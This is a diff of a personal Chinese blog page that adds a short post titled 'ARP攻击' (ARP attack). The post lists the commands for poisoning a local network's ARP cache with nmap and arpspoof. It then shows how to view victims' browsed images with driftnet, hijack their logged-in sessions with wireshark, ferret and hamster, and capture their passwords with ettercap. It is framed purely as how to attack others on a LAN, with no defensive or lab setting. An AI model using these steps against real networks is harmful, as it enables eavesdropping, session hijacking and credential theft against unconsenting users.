@@ -3,7 +3,7 @@
         <head>
         <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
         <meta charset="utf-8">
-        <title>赖奎光</title>
+        <title>ARP攻击 | 赖奎光</title>
         <link rel="stylesheet" href="https://laikuiguang.github.io//styles/main.css">
         <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
         <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
@@ -14,7 +14,7 @@
 
     </head>
     <body>
-          <header class="header mdui-m-b-5">      
+              <header class="header mdui-m-b-5">      
             <div class="container  ">
                 <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://laikuiguang.github.io/">赖奎光</a></div>
                 <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s">温故而知新</div>
@@ -54,25 +54,86 @@
         </header>
         <div class="mdui-container ">
                 <div class="mdui-row">
-                        <div class="mdui-col-md-8 mdui-col-offset-md-2 mdui-m-t-1">
-                         
-                                                         
-                               <article class="mdui-p-a-5 index-list mdui-m-b-3 animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="mdui-typo-body-2 mdui-m-b-1" datetime="2020-08-03 21:33:16">2020-08-03</div>
-                                    <div class="mdui-typo-headline mdui-m-b-3 index-list-title index-guo"><a href="https://laikuiguang.github.io/post/ARP攻击/">ARP攻击</a></div>
-                                    <div class="mdui-typo-subheading mdui-m-b-2 index-neirong"></div>
-                                    <div class="index-list-rm index-guo"><a href="https://laikuiguang.github.io/post/ARP攻击/">Read More</a></div>
-                                </article>
-                                
-                                                            <nav class="mdui-m-t-5">
-                                
-                                
-                                </nav>     
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">ARP攻击</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2020-08-03 21:33:16">2020-08-03 / 2 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><p>局域网攻击😀<br>
+1.获取本机网卡 ifconfig<br>
+2.获取网关以内存在的活跃ip地址  nmap -sP  网关<br>
+3.利用ip进行攻击   arpspoof -i 本机网卡 -t 对方ip地址  -r  网关</p>
+<p>🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅</p>
+<p>局域网攻击-同步获取游览网页信息😀<br>
+1.获取对方ip<br>
+2.进行欺骗（设置流量转发） echo 1（0是默认不转发）&gt;/proc/sys/net/ipv4/ip_forward<br>
+3.进行攻击<br>
+4.利用工具driftnet -i ech0  获取对方当前游览网页图片</p>
+<p>🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅</p>
+<p>局域网攻击-登录局域网其他电脑账号😀<br>
+1.获取对方ip<br>
+2.进行欺骗<br>
+3.进行攻击<br>
+4.利用抓包工具抓取对方正在访问ip wireshark<br>
+5.抓包完成，保存，格式（wireshark/tcpdump/...）<br>
+6.用工具打开文件    ferret -r  保存文件<br>
+7.将生成文件保存至root文件下<br>
+8.运行工具 hamster  （需要修改游览器端口代理）<br>
+9.访问</p>
+<p>🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅🔅</p>
+<p>局域网攻击-获取指定ip的网页 账号密码😀<br>
+1.获取ip<br>
+2.欺骗<br>
+3.查看是否欺骗成功 cat &gt;/proc&gt;sys&gt;net&gt;ipv4&gt;ip_forward<br>
+4.攻击<br>
+5.启动文本回显   ettercap  -Tq （-T  -q）-i  eth0</p>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> </div>
+                                        
 
+                                        
+                                        <div class="mdui-col"></div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://laikuiguang.github.io//media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
                         </div>
                       </div>
+    
+                
+
               </div>
-                <footer class="footer mdui-m-t-5 mdui-text-center">
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
                <nav class="social-links">
                       <ul>
                       
